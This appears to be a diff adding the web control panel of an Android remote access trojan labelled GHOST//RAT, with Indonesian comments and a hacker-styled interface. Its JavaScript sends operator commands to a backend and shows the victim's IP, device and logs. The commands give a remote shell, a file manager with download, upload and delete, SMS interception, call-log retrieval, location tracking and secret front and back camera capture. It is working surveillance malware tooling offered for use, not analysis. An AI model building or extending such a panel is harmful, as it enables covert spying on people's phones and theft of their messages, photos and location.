@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>GHOST//TERMINAL</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        :root {
+            --neon-cyan: #00f3ff;
+            --neon-green: #0f0;
+            --dark-bg: #0b0c10;
+            --panel-bg: #111317;
+            --glow: 0 0 8px;
+            --matrix-green: #1a2a1a;
+        }
+
+        body {
+            background-color: var(--dark-bg);
+            color: var(--neon-cyan);
+            font-family: 'Courier New', Courier, monospace;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0;
+            padding: 10px;
+            text-shadow: 0 0 5px currentColor;
+        }
+
+        /* BOOT SCREEN — ala matrix system load */
+        #boot-screen {
+            position: fixed;
+            inset: 0;
+            background: #030303;
+            z-index: 10000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            transition: opacity 0.6s cubic-bezier(0.97, 0.01, 0.36, 1.0);
+            font-size: clamp(14px, 4vw, 24px);
+            padding: 20px;
+        }
+
+        .boot-anonymous {
+            font-size: 4rem;
+            filter: drop-shadow(0 0 15px #0f0);
+            margin-bottom: 30px;
+            letter-spacing: 5px;
+        }
+
+        .loading-bar-border {
+            width: min(80%, 400px);
+            height: 22px;
+            border: 2px solid var(--neon-green);
+            box-shadow: 0 0 20px var(--neon-green), inset 0 0 5px black;
+            margin: 25px 0 15px;
+            background: #000;
+        }
+
+        #loading-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #0f0, #adff2f);
+            box-shadow: 0 0 15px #0f0;
+            transition: width 0.15s ease-out;
+        }
+
+        /* MAIN DASHBOARD */
+        .container {
+            max-width: 1100px;
+            width: 100%;
+            margin: 0 auto;
+            background: rgba(5, 10, 5, 0.4);
+            backdrop-filter: blur(2px);
+            border: 1px solid #1f3a1f;
+            box-shadow: 0 0 30px rgba(0,255,0,0.1);
+            padding: 20px 15px;
+            border-radius: 12px;
+            display: none;
+        }
+
+        /* anonymous / masked header */
+        .header {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid var(--neon-cyan);
+            padding-bottom: 12px;
+            margin-bottom: 20px;
+        }
+
+        .header h1 {
+            font-size: 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            word-break: break-word;
+        }
+
+        .status-badge {
+            font-size: 0.9rem;
+            padding: 5px 15px;
+            border-radius: 30px;
+            background: #101010;
+            border: 1px solid;
+            box-shadow: var(--glow) currentColor;
+        }
+
+        .online { color: #0f0; border-color: #0f0; }
+        .offline { color: #ff4444; border-color: #ff4444; }
+
+        /* device info panel — retro */
+        .device-panel {
+            background: #0a0f0a;
+            border: 1px solid #2a4a2a;
+            padding: 15px;
+            margin-bottom: 25px;
+            border-radius: 8px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 20px 35px;
+            box-shadow: inset 0 0 20px #000;
+        }
+
+        .device-panel p {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 1rem;
+        }
+
+        .device-panel i { font-style: normal; color: #0f0; }
+
+        /* grid button dashboard — full icon vibe */
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: 15px;
+            margin: 30px 0 15px;
+        }
+
+        .grid button {
+            background: #0e1210;
+            border: 1px solid #2f4f2f;
+            color: var(--neon-cyan);
+            padding: 16px 8px;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            border-radius: 10px;
+            box-shadow: 0 0 8px rgba(0,255,255,0.2);
+            transition: 0.2s;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .grid button:hover {
+            background: #1f3a1f;
+            color: black;
+            border-color: #0f0;
+            box-shadow: 0 0 18px #0f0, inset 0 0 5px #9acd32;
+        }
+
+        .grid button i { font-size: 24px; filter: drop-shadow(0 0 6px cyan); }
+
+        .btn-flash-on {
+            background: #0f0 !important;
+            color: black !important;
+            border-color: #adff2f !important;
+            box-shadow: 0 0 25px #0f0 !important;
+        }
+
+        /* MODERN POPUP (modal) — full terminal feel */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 16, 0, 0.85);
+            backdrop-filter: blur(6px);
+            z-index: 2000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 12px;
+        }
+
+        .modal-terminal {
+            background: #0c0f0c;
+            border: 3px solid #0f0;
+            width: 100%;
+            max-width: 950px;
+            height: 85vh;
+            max-height: 800px;
+            box-shadow: 0 0 50px #0f0, inset 0 0 20px #002200;
+            border-radius: 20px;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        .modal-header {
+            background: #1a2a1a;
+            padding: 12px 18px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid #0f0;
+            color: #0f0;
+            font-weight: bold;
+            font-size: 1.2rem;
+        }
+
+        .close-btn {
+            background: black;
+            border: 1px solid red;
+            color: red;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .close-btn:hover {
+            background: red;
+            color: black;
+            box-shadow: 0 0 20px red;
+        }
+
+        .modal-body {
+            flex: 1;
+            padding: 18px;
+            overflow-y: auto;
+            background: #030703;
+            font-size: 0.95rem;
+            line-height: 1.5;
+            white-space: pre-wrap;
+            word-break: break-all;
+            font-family: 'Courier New', Courier, monospace;
+            color: #b3ffb3;
+        }
+
+        .modal-footer {
+            background: #121812;
+            padding: 15px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            border-top: 2px solid #2c5a2c;
+            align-items: center;
+        }
+
+        .modal-footer input {
+            flex: 3 1 200px;
+            background: #000;
+            border: 1px solid #0f0;
+            color: #0f0;
+            padding: 12px 16px;
+            font-family: inherit;
+            font-size: 1rem;
+            outline: none;
+            border-radius: 40px;
+            box-shadow: inset 0 0 10px black, 0 0 10px rgba(0,255,0,0.3);
+        }
+
+        .modal-footer button {
+            flex: 0 1 auto;
+            background: #103010;
+            border: 2px solid #0f0;
+            color: #0f0;
+            padding: 12px 22px;
+            font-weight: bold;
+            border-radius: 40px;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: 0.2s;
+            box-shadow: 0 0 10px #0f0;
+        }
+
+        .modal-footer button:hover {
+            background: #0f0;
+            color: black;
+        }
+
+        /* list device styling */
+        .device-list-item {
+            border-bottom: 1px dashed #2b5c2b;
+            padding: 10px 5px;
+            display: flex;
+            gap: 15px;
+            font-size: 1.1rem;
+        }
+
+        /* mobile friendly */
+        @media (max-width: 600px) {
+            .grid { grid-template-columns: repeat(2, 1fr); }
+            .header h1 { font-size: 1.2rem; }
+            .modal-footer input { flex: 1 1 100%; }
+            .modal-footer button { width: 100%; }
+        }
+
+        /* glitch anonymous effect */
+        .glitch {
+            text-shadow: -2px 0 cyan, 2px 0 red;
+            animation: glitch 0.3s infinite alternate;
+        }
+
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-2px, 1px); }
+            40% { transform: translate(2px, -1px); }
+        }
+    </style>
+</head>
+<body>
+
+<!-- BOOT SCREEN : loading bar system ala anonymous -->
+<div id="boot-screen">
+    <div class="boot-anonymous">⍟⍟⍟</div>
+    <div style="color:#0f0; font-size:1.5rem;">ESTABLISHING SECURE CHANNEL</div>
+    <div class="loading-bar-border">
+        <div id="loading-bar"></div>
+    </div>
+    <p id="boot-text" style="color:#5f9ea0;">[ SYSTEM BOOT ] handshake ...</p>
+    <p style="margin-top:30px; color:#2e8b57;">GHOSTSHELL // ANONYMOUS MODE</p>
+</div>
+
+<!-- MAIN DASHBOARD -->
+<div class="container" id="main-app">
+    <div class="header">
+        <h1>
+            <span>⌨️ GHOST//RAT</span>
+        </h1>
+        <div id="status" class="status-badge offline">OFFLINE</div>
+    </div>
+
+    <!-- device panel + list device -->
+    <div class="device-panel">
+        <p>🖥️ <i>IP_TARGET:</i> <span id="info-ip">--.--.--.--</span></p>
+        <p>📟 <i>DEVICE:</i> <span id="info-device">unknown</span></p>
+        <p>🌐 <i>INTERFACE:</i> <span id="info-extra">WLAN0</span></p>
+    </div>
+
+    <!-- dashboard penuh icon -->
+    <div class="grid">
+        <button onclick="openModal('terminal')"><i>⌨️</i> TERMINAL</button>
+        <button onclick="openModal('filemanager')"><i>📁</i> FILE MANAGER</button>
+        <button onclick="openModal('apps')"><i>📱</i> APPLICATIONS</button>
+        <button onclick="openModal('sms')"><i>✉️</i> SMS INTERCEPT</button>
+        <button onclick="openModal('calls')"><i>📞</i> CALL LOGS</button>
+        <button onclick="openModal('devices')"><i>📡</i> DEVICE LIST</button>
+        <button onclick="cmd('get_location')"><i>📍</i> TRACK</button>
+        <button onclick="toggleFlash()" id="flashBtn"><i>⚡</i> FLASH</button>
+        <button onclick="cmd('takefrontpic')"><i>🤳</i> FRONT CAM</button>
+        <button onclick="cmd('takebackpic')"><i>📷</i> BACK CAM</button>
+    </div>
+    <div style="color:#3c5e3c; text-align:center; font-size:0.8rem; padding:8px;">[ anonymous root access ]</div>
+</div>
+
+<!-- GLOBAL MODAL (POPUP UNTUK SEMUA) -->
+<div class="modal-overlay" id="globalModal">
+    <div class="modal-terminal">
+        <div class="modal-header">
+            <span id="modalTitle">> GHOST_TERMINAL</span>
+            <span class="close-btn" onclick="closeModal()">✕</span>
+        </div>
+        <div class="modal-body" id="modalOutput">
+            [CONNECTING ...]
+        </div>
+        <div class="modal-footer" id="modalFooter">
+            <!-- dynamic footer (input / button) diisi lewat js -->
+        </div>
+    </div>
+</div>
+
+<script>
+    // -------------------- BOOT SEQUENCE (loading bar) --------------------
+    let progress = 0;
+    const bootEl = document.getElementById('boot-screen');
+    const loadingBar = document.getElementById('loading-bar');
+    const bootText = document.getElementById('boot-text');
+
+    const bootInterval = setInterval(() => {
+        progress += Math.floor(Math.random() * 8) + 4;
+        if (progress >= 100) {
+            progress = 100;
+            clearInterval(bootInterval);
+            bootText.innerText = 'ACCESS GRANTED. LOADING INTERFACE...';
+            setTimeout(() => {
+                bootEl.style.opacity = '0';
+                setTimeout(() => {
+                    bootEl.style.display = 'none';
+                    document.getElementById('main-app').style.display = 'block';
+                }, 600);
+            }, 400);
+        }
+        loadingBar.style.width = progress + '%';
+        if (progress > 30) bootText.innerText = '[ OK ] DECRYPTING PAYLOAD...';
+        if (progress > 65) bootText.innerText = '[ ✓ ] ESTABLISHING GHOST PROXY...';
+    }, 160);
+
+    // -------------------- GLOBAL STATE --------------------
+    let currentModalType = null;   // 'filemanager', 'terminal', dll
+    let flashActive = false;
+    let lastLogCount = 0;          // untuk polling delta logs
+
+    const modal = document.getElementById('globalModal');
+    const modalTitle = document.getElementById('modalTitle');
+    const modalOutput = document.getElementById('modalOutput');
+    const modalFooter = document.getElementById('modalFooter');
+
+    // helper: kirim perintah ke backend (sama seperti sebelumnya)
+    function cmd(command) {
+        fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ cmd: command })
+        }).catch(err => console.warn('cmd err', err));
+    }
+
+    // toggle flash on/off dengan satu tombol
+    function toggleFlash() {
+        flashActive = !flashActive;
+        const btn = document.getElementById('flashBtn');
+        if (flashActive) {
+            cmd('flashon');
+            btn.classList.add('btn-flash-on');
+            btn.innerHTML = '<i>⚡</i> FLASH ON';
+        } else {
+            cmd('flashoff');
+            btn.classList.remove('btn-flash-on');
+            btn.innerHTML = '<i>⚡</i> FLASH';
+        }
+    }
+
+    // -------------------- MODAL CONTROLLER --------------------
+    function openModal(type) {
+        currentModalType = type;
+        modalOutput.innerHTML = '';  // bersihkan
+        modal.style.display = 'flex';
+
+        // Atur judul dan footer dinamis berdasarkan tipe
+        if (type === 'terminal') {
+            modalTitle.innerText = '> ROOT TERMINAL [shell]';
+            modalFooter.innerHTML = `
+                <input type="text" id="modalInput" placeholder="ls, pwd, whoami ..." autocomplete="off">
+                <button onclick="sendCommand()">EXECUTE</button>
+            `;
+            // masuk ke mode shell
+            cmd('shell');
+            setTimeout(() => cmd('echo [Ghost Terminal ready]'), 150);
+        }
+        else if (type === 'filemanager') {
+            modalTitle.innerText = '> FILE MANAGER (remote fs)';
+            modalFooter.innerHTML = `
+                <input type="text" id="modalInput" placeholder="ls, cd folder, rm file, get file, put file" autocomplete="off">
+                <button onclick="sendCommand()">RUN</button>
+            `;
+            cmd('shell');          // masuk mode shell/filemanager
+            setTimeout(() => cmd('ls'), 200);
+        }
+        else if (type === 'apps') {
+            modalTitle.innerText = '> APPLICATIONS (list & run)';
+            modalFooter.innerHTML = `
+                <input type="text" id="modalInput" placeholder="run com.whatsapp | list packages">
+                <button onclick="sendCommand()">EXECUTE</button>
+                <button onclick="cmd('list_app')" style="background:#005500;">⟳ LIST APPS</button>
+            `;
+            cmd('list_app');
+        }
+        else if (type === 'sms') {
+            modalTitle.innerText = '> SMS INBOX';
+            modalFooter.innerHTML = `<button onclick="cmd('getsms')" style="width:100%;">🔄 REFRESH SMS</button>`;
+            cmd('getsms');
+        }
+        else if (type === 'calls') {
+            modalTitle.innerText = '> CALL LOGS';
+            modalFooter.innerHTML = `<button onclick="cmd('getcalllogs')" style="width:100%;">🔄 REFRESH CALLS</button>`;
+            cmd('getcalllogs');
+        }
+        else if (type === 'devices') {
+            modalTitle.innerText = '> DEVICE LIST (network)';
+            modalFooter.innerHTML = `<button onclick="cmd('list_devices')" style="width:100%;">⟳ SCAN NETWORK</button>`;
+            // kita bisa fetch info dari backend atau polling nanti
+            cmd('list_devices');   // asumsikan perintah ini mengembalikan daftar ip+info
+        }
+
+        // event listener untuk enter di input
+        setTimeout(() => {
+            const inp = document.getElementById('modalInput');
+            if (inp) inp.addEventListener('keypress', (e) => { if (e.key === 'Enter') sendCommand(); });
+        }, 100);
+    }
+
+    function closeModal() {
+        // jika sedang di mode shell/filemanager, kirim exit biar backend keluar mode
+        if (currentModalType === 'terminal' || currentModalType === 'filemanager') {
+            cmd('exit');       // keluar dari shell
+        }
+        modal.style.display = 'none';
+        currentModalType = null;
+        modalOutput.innerHTML = '';
+    }
+
+    // fungsi untuk mengirim perintah dari input modal
+    function sendCommand() {
+        const inputField = document.getElementById('modalInput');
+        if (!inputField) return;
+        const val = inputField.value.trim();
+        if (val === '') return;
+
+        // untuk get file: download secara otomatis via fetch? kita handle via backend saja, tapi di web kita bisa kasih notifikasi
+        if (currentModalType === 'filemanager' && val.startsWith('get ')) {
+            modalOutput.innerHTML += `\n[⇣] initiating download: ${val} ... (file akan disimpan di server atau memicu download)\n`;
+        }
+        // upload file perlu fitur khusus, tetapi bisa diarahkan via command "upload"
+        cmd(val);
+        inputField.value = '';
+    }
+
+    // -------------------- POLLING STATUS & LOGS --------------------
+    setInterval(() => {
+        fetch('/api/status')
+            .then(r => r.json())
+            .then(data => {
+                // update header status
+                const statusEl = document.getElementById('status');
+                const ipSpan = document.getElementById('info-ip');
+                const deviceSpan = document.getElementById('info-device');
+
+                if (data.connected) {
+                    statusEl.innerText = `ONLINE ${data.address?.[0] || ''}`;
+                    statusEl.className = 'status-badge online';
+                    ipSpan.innerText = data.address ? `${data.address[0]}:${data.address[1]}` : 'unknown';
+                } else {
+                    statusEl.innerText = 'OFFLINE';
+                    statusEl.className = 'status-badge offline';
+                    ipSpan.innerText = '--.--.--.--';
+                }
+
+                // update device info jika ada di log (cari kata [INFO] atau [DEVICE])
+                if (data.logs) {
+                    for (let line of data.logs) {
+                        if (line.includes('[INFO]') || line.toLowerCase().includes('device:')) {
+                            deviceSpan.innerText = line.substring(line.indexOf(']')+1).trim() || 'android';
+                            break;
+                        }
+                        // jika ada info ip tambahan dll
+                        if (line.includes('ip') && line.includes('model')) deviceSpan.innerText = line;
+                    }
+
+                    // kirim log baru ke modal yg terbuka
+                    if (currentModalType && data.logs.length > lastLogCount) {
+                        const newLogs = data.logs.slice(lastLogCount);
+                        let formatted = '';
+                        newLogs.forEach(l => {
+                            if (l.includes('[ERROR]')) formatted += `<span style="color:#ff5f5f;">${l}</span>\n`;
+                            else if (l.includes('[SMS]') || l.includes('SMS:')) formatted += `<span style="color:#f5e56b;">${l}</span>\n`;
+                            else if (l.includes('[DOWNLOAD]')) formatted += `<span style="color:#5ff0ff;">${l}</span>\n`;
+                            else formatted += l + '\n';
+                        });
+                        modalOutput.innerHTML += formatted;
+                        // auto-scroll
+                        modalOutput.scrollTop = modalOutput.scrollHeight;
+                    }
+                    lastLogCount = data.logs.length;
+                }
+            })
+            .catch(() => {});
+    }, 1300);
+
+    // fallback untuk memastikan command exit_shell jika diperlukan (tapi di close sudah ada exit)
+    window.onclick = function(e) {
+        if (e.target === modal) closeModal();
+    };
+
+    // panggil ini agar status device list bisa diisi (optional)
+    cmd('list_devices');  // polling akan menampilkan
+
+    // untuk demo, tambahkan beberapa sample logs di modal jika perlu
+    window.sendCommand = sendCommand;
+    window.openModal = openModal;
+    window.closeModal = closeModal;
+    window.cmd = cmd;
+    window.toggleFlash = toggleFlash;
+</script>
+</body>
+</html>
